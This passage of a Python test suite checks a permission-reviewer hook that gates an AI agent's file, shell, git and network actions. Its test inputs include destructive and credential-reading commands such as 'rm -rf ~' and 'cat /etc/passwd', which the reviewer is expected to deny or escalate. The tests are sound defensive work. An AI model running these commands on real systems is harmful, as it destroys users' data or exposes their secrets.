from __future__ import annotations

import json
import os
from pathlib import Path
import re
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

import intent_extractor
import llm_classifier
import review_hook


class TestPermissionReviewer(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.tmp_path = Path(self.tmp.name)
        review_hook.os.environ["PLUGIN_DATA"] = str(self.tmp_path / "plugin_data")
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "ledger_only"

    def _write_transcript(self, user_inputs: list[str]) -> Path:
        tp = self.tmp_path / "transcript.jsonl"
        rows = [
            {
                "step_index": i * 2,
                "type": "USER_INPUT",
                "content": f"<USER_REQUEST>\n{text}\n</USER_REQUEST>",
            }
            for i, text in enumerate(user_inputs, start=1)
        ]
        tp.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
        return tp

    def test_tier0_in_workspace_and_hard_deny(self) -> None:
        # In-workspace write -> Tier 0 allow
        res = review_hook.evaluate_tool_call(
            {
                "conversationId": "c1",
                "workspacePaths": ["/workspace/project"],
                "toolCall": {
                    "name": "edit_file",
                    "args": {"Path": "/workspace/project/src/main.cpp"},
                },
            }
        )
        self.assertEqual(res["decision"], "allow")
        self.assertIn("Tier 0", res["reason"])

        # Destructive command -> Tier 0 deny
        res_deny = review_hook.evaluate_tool_call(
            {
                "conversationId": "c1",
                "workspacePaths": ["/workspace/project"],
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "rm -rf ~"},
                },
            }
        )
        self.assertEqual(res_deny["decision"], "deny")

    def test_tier0_local_config_read_only_repos_and_paths(self) -> None:
        local_cfg_path = self.tmp_path / "local_config.json"
        local_cfg_path.write_text(
            json.dumps(
                {
                    "read_only_repos": ["collaborator-org/reference-repo"],
                    "extra_read_only_paths": ["/opt/readonly_ref"],
                    "extra_denied_paths": ["/opt/private_vault"],
                }
            ),
            encoding="utf-8",
        )
        review_hook.os.environ["AGY_PERMISSION_REVIEWER_LOCAL_CONFIG"] = str(local_cfg_path)
        self.addCleanup(lambda: review_hook.os.environ.pop("AGY_PERMISSION_REVIEWER_LOCAL_CONFIG", None))

        # Push or gh issue/PR to read_only_repos -> hard-denied at Tier 0
        r_push = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_local",
                "workspacePaths": ["/workspace/project"],
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "gh pr create --repo collaborator-org/reference-repo"},
                },
            }
        )
        self.assertEqual(r_push["decision"], "deny")
        self.assertIn("read-only repository", r_push["reason"])

        # extra_read_only_paths allows read, blocks write at Tier 0
        r_ro_read = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_local",
                "workspacePaths": ["/workspace/project"],
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/readonly_ref/README.md"},
                },
            }
        )
        self.assertEqual(r_ro_read["decision"], "allow")

        r_ro_write = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_local",
                "workspacePaths": ["/workspace/project"],
                "toolCall": {
                    "name": "write_file",
                    "args": {"Path": "/opt/readonly_ref/README.md", "Content": "x"},
                },
            }
        )
        self.assertEqual(r_ro_write["decision"], "deny")

        # extra_denied_paths blocks read at Tier 0
        r_denied = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_local",
                "workspacePaths": ["/workspace/project"],
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/private_vault/secret.txt"},
                },
            }
        )
        self.assertEqual(r_denied["decision"], "deny")

    def test_tier1_verbal_grant_read_vs_write_and_prohibition(self) -> None:
        tp = self._write_transcript(
            [
                "Disc:29% (~4m) in /setup/tabs. Check /Users and please inspect /opt/ref_code in read-only mode, "
                "and you can create and edit files in /opt/custom_plugins. Never touch /opt/secret_data. "
                "Note that /config and /settings are slash commands, not paths."
            ]
        )
        prev_prose = os.environ.pop("AGY_ENABLE_PROSE_LEDGER", None)
        self.addCleanup(
            lambda: os.environ.__setitem__("AGY_ENABLE_PROSE_LEDGER", prev_prose)
            if prev_prose is not None
            else os.environ.pop("AGY_ENABLE_PROSE_LEDGER", None)
        )

        # 0. By default (AGY_ENABLE_PROSE_LEDGER unset/0), prose regex grants are disabled cleanly
        default_ledger = review_hook.collect_session_ledger(tp)
        self.assertEqual(default_ledger["path_grants"], [])
        self.assertEqual(default_ledger["denied_paths"], [])
        r_default = review_hook.evaluate_tool_call(
            {
                "conversationId": "c2_default",
                "workspacePaths": ["/workspace/project"],
                "transcriptPath": str(tp),
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/ref_code/kernel.hpp"},
                },
            }
        )
        self.assertEqual(r_default["decision"], "ask")

        # Enable hardened opt-in prose ledger to verify false-grant & read-only protections
        os.environ["AGY_ENABLE_PROSE_LEDGER"] = "1"
        ledger = review_hook.collect_session_ledger(tp)
        grant_paths = [pg["path"] for pg in ledger["path_grants"]]
        for rejected in ("/config", "/settings", "~4m", "/setup/tabs", "/Users", str(Path.home())):
            self.assertNotIn(rejected, grant_paths)

        # 1. Read from /opt/ref_code -> allowed by opt-in Tier 1
        r1 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c2",
                "workspacePaths": ["/workspace/project"],
                "transcriptPath": str(tp),
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/ref_code/kernel.hpp"},
                },
            }
        )
        self.assertEqual(r1["decision"], "allow")
        self.assertIn("Tier 1", r1["reason"])

        # 2. Write to /opt/ref_code (granted read-only) -> denied by Tier 1!
        r2 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c2",
                "workspacePaths": ["/workspace/project"],
                "transcriptPath": str(tp),
                "toolCall": {
                    "name": "write_file",
                    "args": {"Path": "/opt/ref_code/kernel.hpp", "Content": "x"},
                },
            }
        )
        self.assertEqual(r2["decision"], "deny")
        self.assertIn("READ-ONLY", r2["reason"])

        # 3. Write to /opt/custom_plugins (granted write) -> allowed by Tier 1!
        r3 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c2",
                "workspacePaths": ["/workspace/project"],
                "transcriptPath": str(tp),
                "toolCall": {
                    "name": "write_file",
                    "args": {"Path": "/opt/custom_plugins/plugin.json", "Content": "{}"},
                },
            }
        )
        self.assertEqual(r3["decision"], "allow")

        # 4. Read from /opt/secret_data (prohibited) -> denied by Tier 1!
        r4 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c2",
                "workspacePaths": ["/workspace/project"],
                "transcriptPath": str(tp),
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/secret_data/keys.txt"},
                },
            }
        )
        self.assertEqual(r4["decision"], "deny")

        # 5. Unmentioned external path -> falls through to Tier 2 fallback ('ask')
        r5 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c2",
                "workspacePaths": ["/workspace/project"],
                "transcriptPath": str(tp),
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/unmentioned/file.txt"},
                },
            }
        )
        self.assertEqual(r5["decision"], "ask")

    def test_tier2_compact_prompt_and_signature_cache(self) -> None:
        prompt = llm_classifier.build_compact_prompt(
            workspace_paths=["/ws"],
            recent_user_messages=["Please check the logs in the parent folder."],
            tool_name="read_file",
            tool_args={"Path": "/outside/run.log"},
        )
        self.assertLess(len(prompt), 500)
        sig1 = llm_classifier.compute_signature(
            "c3", 4, "read_file", {"Path": "/outside/a.log"}
        )
        sig2 = llm_classifier.compute_signature(
            "c3", 4, "read_file", {"Path": "/outside/b.log"}
        )
        # Same directory, same turn, same tool -> identical cache signature!
        self.assertEqual(sig1, sig2)

    def test_git_commit_message_with_git_push_or_slashes_does_not_force_ask(self) -> None:
        # A local git commit inside workspace whose commit message mentions "git push/registry"
        # must fast-allow at Tier 0 rather than matching FORCE_ASK (`git push`) or external paths (`push/registry`).
        res = review_hook.evaluate_tool_call(
            {
                "conversationId": "c4",
                "workspacePaths": ["/workspace/plugins/agy-permission-reviewer"],
                "cwd": "/workspace/project",
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": (
                            'git -C /workspace/plugins/agy-permission-reviewer '
                            'commit -am "Require force_ask on git push/registry publish and add persistent SSH rules" '
                            "# purpose: commit permission reviewer updates"
                        ),
                        "BypassSandbox": True,
                    },
                },
            }
        )
        self.assertEqual(res["decision"], "allow")
        self.assertIn("Tier 0", res["reason"])

        # Whereas an actual `git push` command MUST return 'ask' (translated to 'force_ask')
        res_push = review_hook.evaluate_tool_call(
            {
                "conversationId": "c4",
                "workspacePaths": ["/workspace/plugins/agy-permission-reviewer"],
                "cwd": "/workspace/project",
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": "git -C /workspace/plugins/agy-permission-reviewer push origin main",
                        "BypassSandbox": True,
                    },
                },
            }
        )
        self.assertEqual(res_push["decision"], "ask")
        self.assertEqual(review_hook.to_antigravity_hook_output(res_push)["decision"], "force_ask")

    def test_cache_cap_and_missing_opencode_fallback(self) -> None:
        # 1. Verify per-conversation verdict cache is bounded by MAX_CACHE_ENTRIES
        for idx in range(llm_classifier.MAX_CACHE_ENTRIES + 20):
            llm_classifier.put_cached_verdict(
                "c_cap",
                f"k_{idx}",
                {"effect": "allow", "model": "test"},
            )
        cache_file = intent_extractor.get_data_dir() / "cache_c_cap.json"
        cached_dict = json.loads(cache_file.read_text(encoding="utf-8"))
        self.assertEqual(len(cached_dict), llm_classifier.MAX_CACHE_ENTRIES)
        self.assertNotIn("k_0", cached_dict)
        self.assertIn(f"k_{llm_classifier.MAX_CACHE_ENTRIES + 19}", cached_dict)

        # 2. Verify missing opencode binary falls back cleanly to native prompt ('ask') without 3-strike send-back loop
        res = llm_classifier.apply_unresolved_send_back(
            conversation_id="c_no_opencode",
            verdict={
                "effect": "ask",
                "reasonCode": "review_failed",
                "reason": "opencode/jev-1.13-free: opencode binary not found",
            },
        )
        self.assertEqual(res["decision"], "ask")
        self.assertEqual(res["tier"], "tier2_unavailable")

    def test_directory_delete_and_git_reset_hard_bypass_t0_and_t1_to_tier2(self) -> None:
        ws = str(self.tmp_path / "workspace")
        tp = self._write_transcript([f"Feel free to edit files in {ws} and /opt/custom_plugins"])
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"

        called_cmds: list[str] = []

        def fake_deny_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            called_cmds.append(endpoint)
            return {
                "data": {
                    "answers": [{"choice": "deny", "confidence": 0.96}],
                    "tokens": {"input": 180, "output": 8},
                }
            }

        # Even inside the workspace (or with a Tier 1 path write grant) and BypassSandbox=False,
        # rm -rf and git reset --hard must escalate to Tier 2 (confirmation via chat).
        for cmd in (f"rm -rf {ws}/old_dir", "rm -rf /opt/custom_plugins/old_dir", "git reset --hard HEAD~1"):
            called_cmds.clear()
            res = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c5",
                    "workspacePaths": [ws],
                    "transcriptPath": str(tp),
                    "cwd": ws,
                    "toolCall": {
                        "name": "run_command",
                        "args": {
                            "CommandLine": cmd,
                            "BypassSandbox": False,
                        },
                    },
                },
                api_caller=fake_deny_api,
            )
            self.assertEqual(res["decision"], "deny")
            self.assertEqual(len(called_cmds), 1)
            act = review_hook.build_requested_action(
                "run_command",
                {"CommandLine": cmd, "BypassSandbox": False},
                workspace_paths=[ws],
                cwd=ws,
            )
            self.assertTrue(act["details"]["isDestructiveOrDelete"])

    def test_internal_non_permission_tools_fast_allow_and_hooks_matcher(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"LLM tier should not be invoked for internal tools ({endpoint})")

        for tool_name, args in (
            ("exit_plan_mode", {"plan": "# Big plan\nStep 1..."}),
            ("enter_plan_mode", {"reason": "Need design choice"}),
            ("manage_task", {"Action": "list"}),
            ("schedule", {"DurationSeconds": 10, "Prompt": "ping"}),
            ("search_web", {"query": "python unittest"}),
        ):
            res = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_internal",
                    "workspacePaths": ["/workspace/project"],
                    "toolCall": {"name": tool_name, "args": args},
                },
                api_caller=fail_api,
            )
            self.assertEqual(res["decision"], "allow", msg=f"{tool_name} failed to fast-allow")
            self.assertIn("Tier 0", res["reason"])

        hooks_cfg = json.loads(
            (Path(__file__).resolve().parents[1] / "hooks.json").read_text(encoding="utf-8")
        )
        matcher = hooks_cfg["context-permission-reviewer"]["PreToolUse"][0]["matcher"]
        matcher_re = re.compile(matcher)
        for reviewed in ("run_command", "read_file", "edit_file", "write_file", "call_mcp_tool", "mcp_foo", "browser_click"):
            self.assertIsNotNone(matcher_re.fullmatch(reviewed), msg=f"matcher missed {reviewed}")
        for internal in ("exit_plan_mode", "enter_plan_mode", "manage_task", "schedule", "search_web", "swarm", "invoke_subagent"):
            self.assertIsNone(matcher_re.fullmatch(internal), msg=f"matcher unexpectedly matched {internal}")

    def test_std_bin_paths_env_path_redirects_multi_m_commit_and_gh_api(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"Tier 2 should not run for routine Tier 0 command ({endpoint})")

        routine_cases = [
            ("/usr/bin/git status --short", False),
            ("/usr/bin/git add src/a.py", True),
            ('/usr/bin/git commit -m "title" -m "body mentioning git push and /etc/passwd"', True),
            ('export PATH="/opt/homebrew/bin:/usr/bin:/bin"; /opt/homebrew/bin/uv run pytest 2>&1', True),
            ("/opt/homebrew/bin/gh api repos/org/repo/pulls/1 --jq '.title'", True),
            ("/opt/homebrew/bin/gh pr checks 58 -R org/repo", True),
        ]
        for cmd, bypass in routine_cases:
            res = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_std_bin",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": cmd, "BypassSandbox": bypass}},
                },
                api_caller=fail_api,
            )
            self.assertEqual(res["decision"], "allow", msg=f"Expected Tier 0 allow for: {cmd!r}, got {res}")

        # Mutating /opt/homebrew/bin/gh api -X PATCH must STILL require force_ask
        res_patch = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_std_bin",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": "/opt/homebrew/bin/gh api -X PATCH repos/org/repo/pulls/1 --input /tmp/p.json",
                        "BypassSandbox": True,
                    },
                },
            },
            api_caller=fail_api,
        )
        self.assertEqual(res_patch["decision"], "ask")
        self.assertEqual(review_hook.to_antigravity_hook_output(res_patch)["decision"], "force_ask")

        # Redirect or rm -f targeting /usr/local/bin must NOT fast-allow at Tier 0
        tier2_calls: list[str] = []

        def fake_deny(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            tier2_calls.append(endpoint)
            return {"data": {"answers": [{"choice": "deny", "confidence": 0.95}]}}

        for unsafe_cmd in ("echo hi > /usr/local/bin/evil", "rm -f /usr/local/bin/evil"):
            tier2_calls.clear()
            res_unsafe = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_std_bin",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": unsafe_cmd, "BypassSandbox": True}},
                },
                api_caller=fake_deny,
            )
            self.assertEqual(res_unsafe["decision"], "deny")
            self.assertEqual(len(tier2_calls), 1, msg=f"{unsafe_cmd} bypassed Tier 0!")

    def test_network_command_in_sandbox_denies_without_calling_llm_or_prompting(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"Tier 2 should not run for sandbox network mismatch ({endpoint})")

        with mock.patch.object(review_hook.sys, "platform", "darwin"):
            for net_cmd in (
                "git push origin main",
                "/opt/homebrew/bin/gh pr list --repo org/repo",
                'ssh dev-workstation "df -h"',
            ):
                res = review_hook.evaluate_tool_call(
                    {
                        "conversationId": "c_net_sb",
                        "workspacePaths": [ws],
                        "cwd": ws,
                        "toolCall": {"name": "run_command", "args": {"CommandLine": net_cmd, "BypassSandbox": False}},
                    },
                    api_caller=fail_api,
                )
                self.assertEqual(res["decision"], "deny", msg=f"Expected deny for sandboxed {net_cmd}")
                self.assertIn("BypassSandbox=true", res["reason"])

        # Same git push with BypassSandbox=True -> single native force_ask
        res_ok = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_net_sb",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "run_command", "args": {"CommandLine": "git push origin main", "BypassSandbox": True}},
            },
            api_caller=fail_api,
        )
        self.assertEqual(res_ok["decision"], "ask")
        self.assertEqual(review_hook.to_antigravity_hook_output(res_ok)["decision"], "force_ask")

        # Read-only git status inside sandbox and commit message mentioning git pull/gh pr with BypassSandbox=True fast-allow
        res_status = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_net_sb",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "run_command", "args": {"CommandLine": "git status --short", "BypassSandbox": False}},
            },
            api_caller=fail_api,
        )
        self.assertEqual(res_status["decision"], "allow")

        res_commit = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_net_sb",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": 'git commit -m "Document git pull and gh pr flow"', "BypassSandbox": True},
                },
            },
            api_caller=fail_api,
        )
        self.assertEqual(res_commit["decision"], "allow")

    def test_mpi_tmux_process_and_remote_curl_sandbox_gate_and_mpi_fast_allow(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"Tier 2 should not run here ({endpoint})")

        # Deterministically sandbox-incompatible commands with BypassSandbox=False deny immediately at Tier 0
        with mock.patch.object(review_hook.sys, "platform", "darwin"):
            for sb_cmd in (
                "mpirun -np 3 build/test_mpi",
                "/bin/zsh -lc 'mpirun -np 2 build/test_mpi'",
                "tmux list-sessions",
                "ps -ef",
                "launchctl list",
                "curl -s https://api.github.com/repos/org/repo",
            ):
                res = review_hook.evaluate_tool_call(
                    {
                        "conversationId": "c_sb_incompat",
                        "workspacePaths": [ws],
                        "cwd": ws,
                        "toolCall": {"name": "run_command", "args": {"CommandLine": sb_cmd, "BypassSandbox": False}},
                    },
                    api_caller=fail_api,
                )
                self.assertEqual(res["decision"], "deny", msg=f"Expected Tier 0 deny for sandboxed {sb_cmd!r}")
                self.assertIn("BypassSandbox=true", res["reason"])

        # Loopback HTTP and grep containing |ps/|tmux inside quotes still fast-allow at Tier 0 in sandbox
        for ok_sb_cmd in (
            "curl -s http://127.0.0.1:8765/api/status",
            'grep -E "foo|ps" src/main.py',
        ):
            res_ok_sb = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_sb_incompat",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": ok_sb_cmd, "BypassSandbox": False}},
                },
                api_caller=fail_api,
            )
            self.assertEqual(res_ok_sb["decision"], "allow", msg=f"Expected Tier 0 allow for {ok_sb_cmd!r}")

        # In-workspace MPI binary with BypassSandbox=True fast-allows at Tier 0
        res_mpi = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sb_incompat",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "run_command", "args": {"CommandLine": "mpirun -np 3 build/test_mpi", "BypassSandbox": True}},
            },
            api_caller=fail_api,
        )
        self.assertEqual(res_mpi["decision"], "allow")
        self.assertIn("Tier 0", res_mpi["reason"])

        # Inline python3 -c inside mpirun and mutating tmux send-keys (BypassSandbox=True) must still go to Tier 2
        tier2_calls: list[str] = []

        def fake_allow(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            tier2_calls.append(endpoint)
            return {"data": {"answers": [{"choice": "allow", "confidence": 0.95}]}}

        for tier2_cmd in (
            'mpirun -np 1 python3 -c "import os"',
            'tmux send-keys -t s "cmd" Enter',
        ):
            tier2_calls.clear()
            res_t2 = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_sb_incompat",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": tier2_cmd, "BypassSandbox": True}},
                },
                api_caller=fake_allow,
            )
            self.assertEqual(res_t2["decision"], "allow")
            self.assertEqual(len(tier2_calls), 1, msg=f"{tier2_cmd!r} bypassed Tier 2!")

    def test_sandboxed_inline_python_reuses_session_dir_cache_after_first_approval(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"
        calls: list[str] = []

        def fake_allow(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            calls.append(endpoint)
            return {"data": {"answers": [{"choice": "allow", "confidence": 0.96}]}}

        res1 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "python3 -c 'print(open(\"/opt/ext_proj/a.py\").read())'", "BypassSandbox": False},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res1["decision"], "allow")
        self.assertEqual(len(calls), 1)

        # Different inline python command on the same external dir (still sandboxed) hits session_dir_cache!
        res2 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "python3 -c 'print(len(open(\"/opt/ext_proj/b.py\").read()))'", "BypassSandbox": False},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res2["decision"], "allow")
        self.assertEqual(len(calls), 1)

        # Unsandboxed inline python must NOT reuse session_dir_cache and must still go to Tier 2
        res3 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "python3 -c 'print(open(\"/opt/ext_proj/c.py\").read())'", "BypassSandbox": True},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res3["decision"], "allow")
        self.assertEqual(len(calls), 2)

        # Python // integer division inside sandbox must NOT parse //2 as /2 external path
        res_div = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "python3 -c 'print(10//2)'", "BypassSandbox": False},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res_div["decision"], "allow")
        self.assertEqual(len(calls), 2)
        self.assertIn("Tier 0", res_div["reason"])

        # 4-level-deep file under approved /opt/ext_proj hits session_dir_cache, while sibling /opt/other_proj does not
        res_deep = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/ext_proj/sub1/sub2/sub3/deep.py"},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res_deep["decision"], "allow")
        self.assertEqual(len(calls), 2)

        res_sibling = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/other_proj/secret.py"},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res_sibling["decision"], "allow")
        self.assertEqual(len(calls), 3)

        # Exact/dir-sig cache hit logs tier="session_cache" in audit instead of re-attributing to LLM model
        res_exact_cached = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "read_file",
                    "args": {"Path": "/opt/other_proj/secret.py"},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res_exact_cached["decision"], "allow")
        self.assertEqual(len(calls), 3)
        audit_rows = [
            json.loads(ln)
            for ln in (intent_extractor.get_data_dir() / "audit" / "c_py_cache.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        self.assertEqual(audit_rows[-1]["tier"], "session_cache")

        # Caskroom prefix + echo segment fast-allow cleanly at Tier 0
        res_cask = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_py_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "/opt/homebrew/Caskroom/tool/1.0/bin/pytest && echo done", "BypassSandbox": True},
                },
            },
            api_caller=fake_allow,
        )
        self.assertEqual(res_cask["decision"], "allow")
        self.assertIn("Tier 0", res_cask["reason"])
        self.assertEqual(len(calls), 3)

    def test_division_path_regex_workspace_git_lock_and_git_rm_r(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"Tier 2 should not run here ({endpoint})")

        # 1. Arithmetic division (sum(vals))/1000.0 and vals[0]/2.5 must NOT extract /1000.0 or /2.5 as external paths
        res_div = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_blind_spots",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": "python3 -c 'vals=[1,2]; print((sum(vals))/1000.0, vals[0]/2.5)'",
                        "BypassSandbox": False,
                    },
                },
            },
            api_caller=fail_api,
        )
        self.assertEqual(res_div["decision"], "allow")
        self.assertIn("Tier 0", res_div["reason"])

        # Real /etc/passwd paths inside open(...) or cat "..." must still be extracted and reach Tier 2
        tier2_calls: list[str] = []

        def fake_deny(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            tier2_calls.append(endpoint)
            return {"data": {"answers": [{"choice": "deny", "confidence": 0.97}]}}

        for ext_cmd in ('python3 -c \'open("/etc/passwd")\'', 'cat "/etc/passwd"'):
            tier2_calls.clear()
            res_ext = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_blind_spots",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": ext_cmd, "BypassSandbox": False}},
                },
                api_caller=fake_deny,
            )
            self.assertEqual(res_ext["decision"], "deny")
            self.assertEqual(len(tier2_calls), 1, msg=f"{ext_cmd!r} failed to extract /etc/passwd!")

        # 2. Workspace git write commands fail in sandbox (BypassSandbox=False) -> Tier 0 bounce,
        #    while read-only git status/stash list (BypassSandbox=False) and git add/commit (BypassSandbox=True) fast-allow,
        #    and external git -C /external/repo commit (BypassSandbox=False) is NOT blocked by workspace .git gate.
        with mock.patch.object(review_hook.sys, "platform", "darwin"):
            for ws_git_write in ("git add src/a.py", 'git commit -m "msg"'):
                res_gw = review_hook.evaluate_tool_call(
                    {
                        "conversationId": "c_blind_spots",
                        "workspacePaths": [ws],
                        "cwd": ws,
                        "toolCall": {"name": "run_command", "args": {"CommandLine": ws_git_write, "BypassSandbox": False}},
                    },
                    api_caller=fail_api,
                )
                self.assertEqual(res_gw["decision"], "deny", msg=f"Expected Tier 0 bounce for sandboxed {ws_git_write!r}")
                self.assertIn("BypassSandbox=true", res_gw["reason"])

        for ok_git, bypass in (
            ("git status", False),
            ("git stash list", False),
            ("git add src/a.py", True),
            ('git commit -m "msg"', True),
        ):
            res_gok = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_blind_spots",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": ok_git, "BypassSandbox": bypass}},
                },
                api_caller=fail_api,
            )
            self.assertEqual(res_gok["decision"], "allow", msg=f"Expected Tier 0 allow for {ok_git!r} (bypass={bypass})")

        # External non-workspace git commit with BypassSandbox=False is NOT caught by workspace .git gate (goes to Tier 2)
        tier2_calls.clear()
        res_ext_git = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_blind_spots",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": 'git -C /external/repo commit -m "msg"', "BypassSandbox": False},
                },
            },
            api_caller=fake_deny,
        )
        self.assertEqual(res_ext_git["decision"], "deny")
        self.assertEqual(len(tier2_calls), 1)

        # 3. Recursive git rm -r sets isDestructiveOrDelete=True and goes to Tier 2 in both sandbox modes
        for bypass in (False, True):
            tier2_calls.clear()
            res_git_rm = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_blind_spots",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {
                        "name": "run_command",
                        "args": {"CommandLine": "git rm -r src/old_dir", "BypassSandbox": bypass},
                    },
                },
                api_caller=fake_deny,
            )
            self.assertEqual(res_git_rm["decision"], "deny")
            self.assertEqual(len(tier2_calls), 1)
            act = review_hook.build_requested_action(
                "run_command",
                {"CommandLine": "git rm -r src/old_dir", "BypassSandbox": bypass},
                workspace_paths=[ws],
                cwd=ws,
            )
            self.assertTrue(act["details"]["isDestructiveOrDelete"])

    def test_stdlib_shlex_and_ast_command_path_extraction(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"Tier 2 should not run for safe Tier 0 command ({endpoint})")

        # 1. False-positive eliminations (Tier 0 fast-allow, 0 LLM calls)
        fast_allow_cases = [
            (
                "python3 -c 'vals=[1,2]; total=10; users=2; "
                "print((sum(vals))/1000.0, (total)/users, \"/\".join([\"a\",\"b\"]), len(vals) > 0)'",
                False,
            ),
